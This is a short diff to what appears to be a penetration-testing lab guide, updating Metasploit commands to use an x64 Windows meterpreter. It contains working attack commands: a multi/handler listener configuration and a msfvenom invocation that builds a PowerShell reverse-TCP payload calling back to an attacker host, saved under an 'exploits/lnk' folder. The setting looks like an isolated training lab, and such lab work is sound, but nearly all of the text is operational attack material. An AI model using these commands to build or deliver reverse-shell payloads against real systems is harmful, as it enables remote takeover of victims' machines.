@@ -200,7 +200,7 @@ msfconsole -q
 
 # Configure handler
 use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.56.101
 set LPORT 4444
 set ExitOnSession false
@@ -230,9 +230,11 @@ Generate custom PowerShell payload:
 
 ```bash
 # On Kali
-msfvenom -p windows/meterpreter/reverse_tcp \
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
     LHOST=192.168.56.101 \
     LPORT=4444 \
+    -a x64 \
+    --platform windows \
     -f psh \
     -o /vagrant/exploits/lnk/custom_payload.ps1
 ```
